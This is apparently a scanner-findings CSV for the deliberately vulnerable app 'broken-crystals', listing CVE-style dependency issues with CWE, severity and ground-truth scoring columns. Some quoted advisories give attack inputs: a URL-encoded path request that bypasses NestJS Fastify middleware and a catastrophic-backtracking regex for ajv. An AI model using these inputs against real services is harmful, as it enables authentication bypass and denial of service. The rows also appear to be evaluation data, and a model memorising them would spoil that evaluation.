finding_group_id,tools,target,cwe,severity,location,description,verdict,confidence,ground_truth_match,tool_count
GRP-broken-crystals-CWE-347-452,npm-audit,broken-crystals,CWE-347,high,jws,auth0/node-jws Improperly Verifies HMAC Signature,TP,medium,yes,1
GRP-broken-crystals-CWE-347-453,dep-check,broken-crystals,CWE-347,high,jws:3.2.2,"### Overview An improper signature verification vulnerability exists when using auth0/node-jws with the HS256 algorithm under specific conditions. ### Am I Affected? You are affected by this vulnerability if you meet all of the following preconditions: 1. Application uses the auth0/node-jws implementation of JSON Web Signatures, versions <=3.2.2 || 4.0.0 2. Application uses the jws.createVerify() function for HMAC algorithms 3. Application uses user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines You are NOT affected by this vulnerability if you meet any of the following preconditions: 1. Application uses the jws.verify() interface (note: `auth0/node-jsonwebtoken` users fall into this category and are therefore NOT affected by this vulnerability) 2. Application uses only asymmetric algorithms (e.g. RS256) 3. Application doesn’t use user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines ### Fix Upgrade auth0/node-jws version to version 3.2.3 or 4.0.1 ### Acknowledgement Okta would like to thank Félix Charette for discovering this vulnerability.",TP,medium,yes,1
GRP-broken-crystals-CWE-347-454,trivy,broken-crystals,CWE-347,high,libperl5.28@5.28.1-6+deb10u1,perl-CPAN: Bypass of verification of signatures in CHECKSUMS files,TP,medium,yes,1
GRP-broken-crystals-CWE-347-455,trivy,broken-crystals,CWE-347,high,perl@5.28.1-6+deb10u1,perl-CPAN: Bypass of verification of signatures in CHECKSUMS files,TP,medium,yes,1
GRP-broken-crystals-CWE-347-456,trivy,broken-crystals,CWE-347,high,perl-base@5.28.1-6+deb10u1,perl-CPAN: Bypass of verification of signatures in CHECKSUMS files,TP,medium,yes,1
GRP-broken-crystals-CWE-347-457,trivy,broken-crystals,CWE-347,high,perl-modules-5.28@5.28.1-6+deb10u1,perl-CPAN: Bypass of verification of signatures in CHECKSUMS files,TP,medium,yes,1
GRP-broken-crystals-CWE-347-458,trivy,broken-crystals,CWE-347,low,elliptic@6.5.4,elliptic: nodejs/elliptic: EDDSA signature malleability due to missing signature length check,TP,medium,yes,1
GRP-broken-crystals-CWE-347-459,trivy,broken-crystals,CWE-347,high,jws@3.2.2,node-jws: auth0/node-jws: Improper signature verification in HS256 algorithm,TP,medium,yes,1
GRP-broken-crystals-CWE-352-460,trivy,broken-crystals,CWE-352,medium,axios@0.21.4,axios: exposure of confidential data stored in cookies,TP,medium,yes,1
GRP-broken-crystals-CWE-352-461,trivy,broken-crystals,CWE-352,medium,axios@0.26.1,axios: exposure of confidential data stored in cookies,TP,medium,yes,1
GRP-broken-crystals-CWE-354-462,trivy,broken-crystals,CWE-354,medium,openssh-client@1:7.9p1-10+deb10u2,ssh: Prefix truncation attack on Binary Packet Protocol (BPP),pending,low,no,1
GRP-broken-crystals-CWE-362-463,trivy,broken-crystals,CWE-362,medium,libpython2.7-minimal@2.7.16-2+deb10u1,python: constant-time-defeating optimisations issue in the compare_digest function in Lib/hmac.p,pending,low,no,1
GRP-broken-crystals-CWE-362-464,trivy,broken-crystals,CWE-362,medium,libpython2.7-stdlib@2.7.16-2+deb10u1,python: constant-time-defeating optimisations issue in the compare_digest function in Lib/hmac.p,pending,low,no,1
GRP-broken-crystals-CWE-362-465,trivy,broken-crystals,CWE-362,medium,libpython3.7-minimal@3.7.3-2+deb10u4,python: constant-time-defeating optimisations issue in the compare_digest function in Lib/hmac.p,pending,low,no,1
GRP-broken-crystals-CWE-362-466,trivy,broken-crystals,CWE-362,medium,libpython3.7-stdlib@3.7.3-2+deb10u4,python: constant-time-defeating optimisations issue in the compare_digest function in Lib/hmac.p,pending,low,no,1
GRP-broken-crystals-CWE-362-467,trivy,broken-crystals,CWE-362,high,linux-libc-dev@4.19.269-1,kernel: saa7134: race condition leading to use-after-free in saa7134_finidev(),pending,low,no,1
GRP-broken-crystals-CWE-362-468,trivy,broken-crystals,CWE-362,medium,python2.7@2.7.16-2+deb10u1,python: constant-time-defeating optimisations issue in the compare_digest function in Lib/hmac.p,pending,low,no,1
GRP-broken-crystals-CWE-362-469,trivy,broken-crystals,CWE-362,medium,python2.7-minimal@2.7.16-2+deb10u1,python: constant-time-defeating optimisations issue in the compare_digest function in Lib/hmac.p,pending,low,no,1
GRP-broken-crystals-CWE-362-470,trivy,broken-crystals,CWE-362,medium,python3.7@3.7.3-2+deb10u4,python: constant-time-defeating optimisations issue in the compare_digest function in Lib/hmac.p,pending,low,no,1
GRP-broken-crystals-CWE-362-471,trivy,broken-crystals,CWE-362,medium,python3.7-minimal@3.7.3-2+deb10u4,python: constant-time-defeating optimisations issue in the compare_digest function in Lib/hmac.p,pending,low,no,1
GRP-broken-crystals-CWE-367-472,npm-audit,broken-crystals,CWE-367,high,@nestjs/platform-fastify,Nest has a Fastify URL Encoding Middleware Bypass (TOCTOU),pending,low,no,1
GRP-broken-crystals-CWE-367-473,dep-check,broken-crystals,CWE-367,info,@nestjs/platform-fastify:10.4.7,"A NestJS application is vulnerable if it meets all of the following criteria: 1. Platform: Uses `@nestjs/platform-fastify`. 2. Security Mechanism: Relies on `NestMiddleware` (via `MiddlewareConsumer`) for security checks (authentication, authorization, etc.), or through `app.use()` 3. Routing: Applies middleware to specific routes using string paths or controllers (e.g., `.forRoutes('admin')`). Example Vulnerable Config: ```ts // app.module.ts export class AppModule implements NestModule { configure(consumer: MiddlewareConsumer) { consumer .apply(AuthMiddleware) // Security check .forRoutes('admin'); // Vulnerable: Path-based restriction } } ``` Attack Vector: - Target Route: `/admin` - Middleware Path: `admin` - Attack Request: `GET /%61dmin` - Result: Middleware is skipped (no match on `%61dmin`), but controller for `/admin` is executed. Consequences: - Authentication Bypass: Unauthenticated users can access protected routes. - Authorization Bypass: Restricted administrative endpoints become accessible to lower-privileged users. - Input Validation Bypass: Middleware performing sanitization or validation can be skipped. ### Patches Patched in `@nestjs/platform-fastify@11.1.11` ### Resources Credit goes to Hacktron AI for reporting this issue.",pending,low,no,1
GRP-broken-crystals-CWE-367-474,trivy,broken-crystals,CWE-367,high,linux-libc-dev@4.19.269-1,kernel: DPT I2O controller TOCTOU information disclosure vulnerability,pending,low,no,1
GRP-broken-crystals-CWE-367-475,trivy,broken-crystals,CWE-367,medium,@nestjs/platform-fastify@9.3.9,nestjs: NestJS framework: Security bypass allows unauthorized access to protected routes,pending,low,no,1
GRP-broken-crystals-CWE-369-476,trivy,broken-crystals,CWE-369,high,imagemagick@8:6.9.10.23+dfsg-2.1+deb10u4,ImagemMagick: Division by zero in WaveImage() of MagickCore/visual-effects.c,pending,low,no,1
GRP-broken-crystals-CWE-369-477,trivy,broken-crystals,CWE-369,high,imagemagick-6-common@8:6.9.10.23+dfsg-2.1+deb10u4,ImagemMagick: Division by zero in WaveImage() of MagickCore/visual-effects.c,pending,low,no,1
GRP-broken-crystals-CWE-369-478,trivy,broken-crystals,CWE-369,high,imagemagick-6.q16@8:6.9.10.23+dfsg-2.1+deb10u4,ImagemMagick: Division by zero in WaveImage() of MagickCore/visual-effects.c,pending,low,no,1
GRP-broken-crystals-CWE-369-479,trivy,broken-crystals,CWE-369,medium,libdjvulibre-dev@3.5.27.1-10+deb10u1,An issue was discovered IW44Image.cpp in djvulibre 3.5.28 in allows at ...,pending,low,no,1
GRP-broken-crystals-CWE-369-480,trivy,broken-crystals,CWE-369,medium,libdjvulibre-text@3.5.27.1-10+deb10u1,An issue was discovered IW44Image.cpp in djvulibre 3.5.28 in allows at ...,pending,low,no,1
GRP-broken-crystals-CWE-369-481,trivy,broken-crystals,CWE-369,medium,libdjvulibre21@3.5.27.1-10+deb10u1,An issue was discovered IW44Image.cpp in djvulibre 3.5.28 in allows at ...,pending,low,no,1
GRP-broken-crystals-CWE-369-482,trivy,broken-crystals,CWE-369,medium,libheif1@1.3.2-2~deb10u1,A Segmentation fault caused by a floating point exception exists in li ...,pending,low,no,1
GRP-broken-crystals-CWE-369-483,trivy,broken-crystals,CWE-369,high,libmagickcore-6-arch-config@8:6.9.10.23+dfsg-2.1+deb10u4,ImagemMagick: Division by zero in WaveImage() of MagickCore/visual-effects.c,pending,low,no,1
GRP-broken-crystals-CWE-369-484,trivy,broken-crystals,CWE-369,high,libmagickcore-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImagemMagick: Division by zero in WaveImage() of MagickCore/visual-effects.c,pending,low,no,1
GRP-broken-crystals-CWE-369-485,trivy,broken-crystals,CWE-369,high,libmagickcore-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImagemMagick: Division by zero in WaveImage() of MagickCore/visual-effects.c,pending,low,no,1
GRP-broken-crystals-CWE-369-486,trivy,broken-crystals,CWE-369,high,libmagickcore-6.q16-6-extra@8:6.9.10.23+dfsg-2.1+deb10u4,ImagemMagick: Division by zero in WaveImage() of MagickCore/visual-effects.c,pending,low,no,1
GRP-broken-crystals-CWE-369-487,trivy,broken-crystals,CWE-369,high,libmagickcore-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImagemMagick: Division by zero in WaveImage() of MagickCore/visual-effects.c,pending,low,no,1
GRP-broken-crystals-CWE-369-488,trivy,broken-crystals,CWE-369,high,libmagickcore-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImagemMagick: Division by zero in WaveImage() of MagickCore/visual-effects.c,pending,low,no,1
GRP-broken-crystals-CWE-369-489,trivy,broken-crystals,CWE-369,high,libmagickwand-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImagemMagick: Division by zero in WaveImage() of MagickCore/visual-effects.c,pending,low,no,1
GRP-broken-crystals-CWE-369-490,trivy,broken-crystals,CWE-369,high,libmagickwand-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImagemMagick: Division by zero in WaveImage() of MagickCore/visual-effects.c,pending,low,no,1
GRP-broken-crystals-CWE-369-491,trivy,broken-crystals,CWE-369,high,libmagickwand-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImagemMagick: Division by zero in WaveImage() of MagickCore/visual-effects.c,pending,low,no,1
GRP-broken-crystals-CWE-369-492,trivy,broken-crystals,CWE-369,high,libmagickwand-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImagemMagick: Division by zero in WaveImage() of MagickCore/visual-effects.c,pending,low,no,1
GRP-broken-crystals-CWE-369-493,trivy,broken-crystals,CWE-369,medium,linux-libc-dev@4.19.269-1,kernel: fbdev: sis: Error out if pixclock equals zero,pending,low,no,1
GRP-broken-crystals-CWE-385-494,trivy,broken-crystals,CWE-385,high,libgnutls-dane0@3.6.7-4+deb10u10,gnutls: incomplete fix for CVE-2023-5981,pending,low,no,1
GRP-broken-crystals-CWE-385-495,trivy,broken-crystals,CWE-385,high,libgnutls-openssl27@3.6.7-4+deb10u10,gnutls: incomplete fix for CVE-2023-5981,pending,low,no,1
GRP-broken-crystals-CWE-385-496,trivy,broken-crystals,CWE-385,high,libgnutls28-dev@3.6.7-4+deb10u10,gnutls: incomplete fix for CVE-2023-5981,pending,low,no,1
GRP-broken-crystals-CWE-385-497,trivy,broken-crystals,CWE-385,high,libgnutls30@3.6.7-4+deb10u10,gnutls: incomplete fix for CVE-2023-5981,pending,low,no,1
GRP-broken-crystals-CWE-385-498,trivy,broken-crystals,CWE-385,high,libgnutlsxx28@3.6.7-4+deb10u10,gnutls: incomplete fix for CVE-2023-5981,pending,low,no,1
GRP-broken-crystals-CWE-399-499,trivy,broken-crystals,CWE-399,high,linux-libc-dev@4.19.269-1,kernel: memory exhaustion via crafted Graphics Execution Manager (GEM) objects,pending,low,no,1
GRP-broken-crystals-CWE-400-500,npm-audit,broken-crystals,CWE-400,info,ajv,ajv has ReDoS when using `$data` option,TP,medium,yes,1
GRP-broken-crystals-CWE-400-501,npm-audit,broken-crystals,CWE-400,low,brace-expansion,brace-expansion Regular Expression Denial of Service vulnerability,TP,medium,yes,1
GRP-broken-crystals-CWE-400-502,npm-audit,broken-crystals,CWE-400,low,diff,jsdiff has a Denial of Service vulnerability in parsePatch and applyPatch,TP,medium,yes,1
GRP-broken-crystals-CWE-400-503,dep-check,broken-crystals,CWE-400,info,ajv:6.12.6,"ajv (Another JSON Schema Validator) through version 8.17.1 is vulnerable to Regular Expression Denial of Service (ReDoS) when the `$data` option is enabled. The pattern keyword accepts runtime data via JSON Pointer syntax (`$data` reference), which is passed directly to the JavaScript `RegExp()` constructor without validation. An attacker can inject a malicious regex pattern (e.g., `\""^(a|a)*$\""`) combined with crafted input to cause catastrophic backtracking. A 31-character payload causes approximately 44 seconds of CPU blocking, with each additional character doubling execution time. This enables complete denial of service with a single HTTP request against any API using ajv with `$data`: true for dynamic schema validation.",TP,medium,yes,1
GRP-broken-crystals-CWE-400-504,dep-check,broken-crystals,CWE-400,info,ajv:8.17.1,"ajv (Another JSON Schema Validator) through version 8.17.1 is vulnerable to Regular Expression Denial of Service (ReDoS) when the `$data` option is enabled. The pattern keyword accepts runtime data via JSON Pointer syntax (`$data` reference), which is passed directly to the JavaScript `RegExp()` constructor without validation. An attacker can inject a malicious regex pattern (e.g., `\""^(a|a)*$\""`) combined with crafted input to cause catastrophic backtracking. A 31-character payload causes approximately 44 seconds of CPU blocking, with each additional character doubling execution time. This enables complete denial of service with a single HTTP request against any API using ajv with `$data`: true for dynamic schema validation.",TP,medium,yes,1
GRP-broken-crystals-CWE-400-505,dep-check,broken-crystals,CWE-400,low,brace-expansion:1.1.11,"A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.",TP,medium,yes,1
GRP-broken-crystals-CWE-400-506,dep-check,broken-crystals,CWE-400,high,libxmljs:1.0.11,"A vulnerability exists in the libxmljs 1.0.11 when parsing a specially crafted XML document. Accessing the internal _ref property on entity_ref and entity_decl nodes causes a segmentation fault, potentially leading to a denial-of-service (DoS).",TP,medium,yes,1
GRP-broken-crystals-CWE-400-507,trivy,broken-crystals,CWE-400,high,libexpat1@2.2.6-2+deb10u6,expat: parsing large tokens can trigger a denial of service,TP,medium,yes,1
GRP-broken-crystals-CWE-400-508,trivy,broken-crystals,CWE-400,high,libexpat1-dev@2.2.6-2+deb10u6,expat: parsing large tokens can trigger a denial of service,TP,medium,yes,1
GRP-broken-crystals-CWE-400-509,trivy,broken-crystals,CWE-400,high,libglib2.0-0@2.58.3-2+deb10u4,glib: GVariant offset table entry size is not checked in is_normal(),TP,medium,yes,1
GRP-broken-crystals-CWE-400-510,trivy,broken-crystals,CWE-400,high,libglib2.0-bin@2.58.3-2+deb10u4,glib: GVariant offset table entry size is not checked in is_normal(),TP,medium,yes,1
GRP-broken-crystals-CWE-400-511,trivy,broken-crystals,CWE-400,high,libglib2.0-data@2.58.3-2+deb10u4,glib: GVariant offset table entry size is not checked in is_normal(),TP,medium,yes,1
GRP-broken-crystals-CWE-400-512,trivy,broken-crystals,CWE-400,high,libglib2.0-dev@2.58.3-2+deb10u4,glib: GVariant offset table entry size is not checked in is_normal(),TP,medium,yes,1
GRP-broken-crystals-CWE-400-513,trivy,broken-crystals,CWE-400,high,libglib2.0-dev-bin@2.58.3-2+deb10u4,glib: GVariant offset table entry size is not checked in is_normal(),TP,medium,yes,1
GRP-broken-crystals-CWE-400-514,trivy,broken-crystals,CWE-400,high,libnghttp2-14@1.36.0-2+deb10u1,HTTP/2: Multiple HTTP/2 enabled web servers are vulnerable to a DDoS attack (Rapid Reset Attack),TP,medium,yes,1
GRP-broken-crystals-CWE-400-515,trivy,broken-crystals,CWE-400,medium,libpq-dev@11.19-0+deb10u1,postgresql: Role pg_signal_backend can signal certain superuser processes.,TP,medium,yes,1
GRP-broken-crystals-CWE-400-516,trivy,broken-crystals,CWE-400,medium,libpq5@11.19-0+deb10u1,postgresql: Role pg_signal_backend can signal certain superuser processes.,TP,medium,yes,1
GRP-broken-crystals-CWE-400-517,trivy,broken-crystals,CWE-400,medium,libpython2.7-minimal@2.7.16-2+deb10u1,python: wrong backtracking in urllib.request.AbstractBasicAuthHandler allows for a ReDoS,TP,medium,yes,1
GRP-broken-crystals-CWE-400-518,trivy,broken-crystals,CWE-400,medium,libpython2.7-stdlib@2.7.16-2+deb10u1,python: wrong backtracking in urllib.request.AbstractBasicAuthHandler allows for a ReDoS,TP,medium,yes,1
GRP-broken-crystals-CWE-400-519,trivy,broken-crystals,CWE-400,medium,libpython3.7-minimal@3.7.3-2+deb10u4,python: urllib: Regular expression DoS in AbstractBasicAuthHandler,TP,medium,yes,1
GRP-broken-crystals-CWE-400-520,trivy,broken-crystals,CWE-400,medium,libpython3.7-stdlib@3.7.3-2+deb10u4,python: urllib: Regular expression DoS in AbstractBasicAuthHandler,TP,medium,yes,1
GRP-broken-crystals-CWE-400-521,trivy,broken-crystals,CWE-400,high,libsystemd0@241-7~deb10u9,bind9: Preparing an NSEC3 closest encloser proof can exhaust CPU resources,TP,medium,yes,1
GRP-broken-crystals-CWE-400-522,trivy,broken-crystals,CWE-400,medium,libtiff-dev@4.1.0+git191117-2~deb10u7,libtiff: Out-of-memory in TIFFOpen via a craft file,TP,medium,yes,1
GRP-broken-crystals-CWE-400-523,trivy,broken-crystals,CWE-400,medium,libtiff5@4.1.0+git191117-2~deb10u7,libtiff: Out-of-memory in TIFFOpen via a craft file,TP,medium,yes,1
GRP-broken-crystals-CWE-400-524,trivy,broken-crystals,CWE-400,medium,libtiffxx5@4.1.0+git191117-2~deb10u7,libtiff: Out-of-memory in TIFFOpen via a craft file,TP,medium,yes,1
GRP-broken-crystals-CWE-400-525,trivy,broken-crystals,CWE-400,high,libudev1@241-7~deb10u9,bind9: Preparing an NSEC3 closest encloser proof can exhaust CPU resources,TP,medium,yes,1
GRP-broken-crystals-CWE-400-526,trivy,broken-crystals,CWE-400,high,libunbound8@1.9.0-2+deb10u3,bind9: Preparing an NSEC3 closest encloser proof can exhaust CPU resources,TP,medium,yes,1
GRP-broken-crystals-CWE-400-527,trivy,broken-crystals,CWE-400,medium,libx11-6@2:1.6.7-1+deb10u2,libX11: stack exhaustion from infinite recursion in PutSubImage(),TP,medium,yes,1
GRP-broken-crystals-CWE-400-528,trivy,broken-crystals,CWE-400,medium,libx11-data@2:1.6.7-1+deb10u2,libX11: stack exhaustion from infinite recursion in PutSubImage(),TP,medium,yes,1
GRP-broken-crystals-CWE-400-529,trivy,broken-crystals,CWE-400,medium,libx11-dev@2:1.6.7-1+deb10u2,libX11: stack exhaustion from infinite recursion in PutSubImage(),TP,medium,yes,1
GRP-broken-crystals-CWE-400-530,trivy,broken-crystals,CWE-400,high,linux-libc-dev@4.19.269-1,kernel: ICMPv6 “Packet Too Big” packets force a DoS of the Linux kernel by forcing 100% CPU,TP,medium,yes,1
GRP-broken-crystals-CWE-400-531,trivy,broken-crystals,CWE-400,medium,python2.7@2.7.16-2+deb10u1,python: wrong backtracking in urllib.request.AbstractBasicAuthHandler allows for a ReDoS,TP,medium,yes,1
GRP-broken-crystals-CWE-400-532,trivy,broken-crystals,CWE-400,medium,python2.7-minimal@2.7.16-2+deb10u1,python: wrong backtracking in urllib.request.AbstractBasicAuthHandler allows for a ReDoS,TP,medium,yes,1
GRP-broken-crystals-CWE-400-533,trivy,broken-crystals,CWE-400,medium,python3.7@3.7.3-2+deb10u4,python: urllib: Regular expression DoS in AbstractBasicAuthHandler,TP,medium,yes,1
GRP-broken-crystals-CWE-400-534,trivy,broken-crystals,CWE-400,medium,python3.7-minimal@3.7.3-2+deb10u4,python: urllib: Regular expression DoS in AbstractBasicAuthHandler,TP,medium,yes,1
GRP-broken-crystals-CWE-400-535,trivy,broken-crystals,CWE-400,low,brace-expansion@1.1.11,brace-expansion: juliangruber brace-expansion index.js expand redos,TP,medium,yes,1
GRP-broken-crystals-CWE-400-536,trivy,broken-crystals,CWE-400,low,brace-expansion@2.0.1,brace-expansion: juliangruber brace-expansion index.js expand redos,TP,medium,yes,1
GRP-broken-crystals-CWE-400-537,trivy,broken-crystals,CWE-400,medium,graphql@16.6.0,graphql: Insufficient checks in the OverlappingFieldsCanBeMergedRule.ts file when parsing large queries,TP,medium,yes,1
GRP-broken-crystals-CWE-400-538,trivy,broken-crystals,CWE-400,medium,jose@4.13.1,jose: resource exhaustion,TP,medium,yes,1
GRP-broken-crystals-CWE-400-539,trivy,broken-crystals,CWE-400,high,libxmljs@0.19.7,"libxmljs has segmentation fault, potentially leading to a denial-of-service (DoS)",TP,medium,yes,1
GRP-broken-crystals-CWE-400-540,trivy,broken-crystals,CWE-400,medium,tar@4.4.19,node-tar: denial of service while parsing a tar file due to lack of folders depth validation,TP,medium,yes,1
GRP-broken-crystals-CWE-400-541,trivy,broken-crystals,CWE-400,medium,tar@6.1.13,node-tar: denial of service while parsing a tar file due to lack of folders depth validation,TP,medium,yes,1
GRP-broken-crystals-CWE-401-542,dep-check,broken-crystals,CWE-401,low,undici:5.28.4,"### Impact Applications that use undici to implement a webhook-like system are vulnerable. If the attacker set up a server with an invalid certificate, and they can force the application to call the webhook repeatedly, then they can cause a memory leak. ### Patches This has been patched in https://github.com/nodejs/undici/pull/4088. ### Workarounds If a webhook fails, avoid keep calling it repeatedly. ### References Reported as: https://github.com/nodejs/undici/issues/3895",pending,low,no,1
GRP-broken-crystals-CWE-401-543,trivy,broken-crystals,CWE-401,high,imagemagick@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: memory leak in identify -help,pending,low,no,1
GRP-broken-crystals-CWE-401-544,trivy,broken-crystals,CWE-401,high,imagemagick-6-common@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: memory leak in identify -help,pending,low,no,1
GRP-broken-crystals-CWE-401-545,trivy,broken-crystals,CWE-401,high,imagemagick-6.q16@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: memory leak in identify -help,pending,low,no,1
GRP-broken-crystals-CWE-401-546,trivy,broken-crystals,CWE-401,high,libmagickcore-6-arch-config@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: memory leak in identify -help,pending,low,no,1
GRP-broken-crystals-CWE-401-547,trivy,broken-crystals,CWE-401,high,libmagickcore-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: memory leak in identify -help,pending,low,no,1
GRP-broken-crystals-CWE-401-548,trivy,broken-crystals,CWE-401,high,libmagickcore-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: memory leak in identify -help,pending,low,no,1
GRP-broken-crystals-CWE-401-549,trivy,broken-crystals,CWE-401,high,libmagickcore-6.q16-6-extra@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: memory leak in identify -help,pending,low,no,1
GRP-broken-crystals-CWE-401-550,trivy,broken-crystals,CWE-401,high,libmagickcore-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: memory leak in identify -help,pending,low,no,1
GRP-broken-crystals-CWE-401-551,trivy,broken-crystals,CWE-401,high,libmagickcore-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: memory leak in identify -help,pending,low,no,1
GRP-broken-crystals-CWE-401-552,trivy,broken-crystals,CWE-401,high,libmagickwand-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: memory leak in identify -help,pending,low,no,1
GRP-broken-crystals-CWE-401-553,trivy,broken-crystals,CWE-401,high,libmagickwand-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: memory leak in identify -help,pending,low,no,1
GRP-broken-crystals-CWE-401-554,trivy,broken-crystals,CWE-401,high,libmagickwand-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: memory leak in identify -help,pending,low,no,1
GRP-broken-crystals-CWE-401-555,trivy,broken-crystals,CWE-401,high,libmagickwand-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: memory leak in identify -help,pending,low,no,1
GRP-broken-crystals-CWE-401-556,trivy,broken-crystals,CWE-401,medium,linux-libc-dev@4.19.269-1,kernel: sctp: fail if no bound addresses can be used for a given scope,pending,low,no,1
GRP-broken-crystals-CWE-401-557,trivy,broken-crystals,CWE-401,low,undici@5.21.0,undici: Undici Memory Leak with Invalid Certificates,pending,low,no,1
GRP-broken-crystals-CWE-405-558,trivy,broken-crystals,CWE-405,medium,libpython2.7-minimal@2.7.16-2+deb10u1,python: The zipfile module is vulnerable to zip-bombs leading to denial of service,pending,low,no,1
GRP-broken-crystals-CWE-405-559,trivy,broken-crystals,CWE-405,medium,libpython2.7-stdlib@2.7.16-2+deb10u1,python: The zipfile module is vulnerable to zip-bombs leading to denial of service,pending,low,no,1
GRP-broken-crystals-CWE-405-560,trivy,broken-crystals,CWE-405,medium,libpython3.7-minimal@3.7.3-2+deb10u4,python: The zipfile module is vulnerable to zip-bombs leading to denial of service,pending,low,no,1
GRP-broken-crystals-CWE-405-561,trivy,broken-crystals,CWE-405,medium,libpython3.7-stdlib@3.7.3-2+deb10u4,python: The zipfile module is vulnerable to zip-bombs leading to denial of service,pending,low,no,1
GRP-broken-crystals-CWE-405-562,trivy,broken-crystals,CWE-405,medium,python2.7@2.7.16-2+deb10u1,python: The zipfile module is vulnerable to zip-bombs leading to denial of service,pending,low,no,1
GRP-broken-crystals-CWE-405-563,trivy,broken-crystals,CWE-405,medium,python2.7-minimal@2.7.16-2+deb10u1,python: The zipfile module is vulnerable to zip-bombs leading to denial of service,pending,low,no,1
GRP-broken-crystals-CWE-405-564,trivy,broken-crystals,CWE-405,medium,python3.7@3.7.3-2+deb10u4,python: The zipfile module is vulnerable to zip-bombs leading to denial of service,pending,low,no,1
GRP-broken-crystals-CWE-405-565,trivy,broken-crystals,CWE-405,medium,python3.7-minimal@3.7.3-2+deb10u4,python: The zipfile module is vulnerable to zip-bombs leading to denial of service,pending,low,no,1
